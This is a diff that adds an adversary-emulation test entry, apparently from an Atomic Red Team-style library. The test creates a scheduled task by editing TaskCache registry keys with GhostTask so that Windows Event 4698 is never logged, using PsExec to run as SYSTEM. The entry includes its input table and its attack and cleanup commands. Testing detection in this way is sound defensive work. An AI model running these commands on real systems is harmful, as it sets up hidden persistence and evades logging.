@@ -1,0 +1,13 @@
+Create a scheduled task through manipulation of registry keys. This procedure is implemented using the GhostTask utility. By manipulating registry keys under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means. This requires a download of the GhostTask binary, which must be run as NT Authority\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.
+Inputs:
+Name	Description	Type	Default Value
+task_name	Name of the newly-added task	string	lilghostie
+task_command	Command you want the task to execute	string	notepad.exe
+target	System where the task should run	string	localhost
+user_name	Username to authenticate with, such as ATOMICDOMAIN\AtomicAdmin	string	$env:USERDOMAIN + '\' + $env:USERNAME
+Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin)
+"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
+"PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} add #{task_name} "cmd.exe" "/c #{task_command}" #{user_name} logon
+Cleanup Commands:
+"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
+"PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} delete #{task_name} > nul
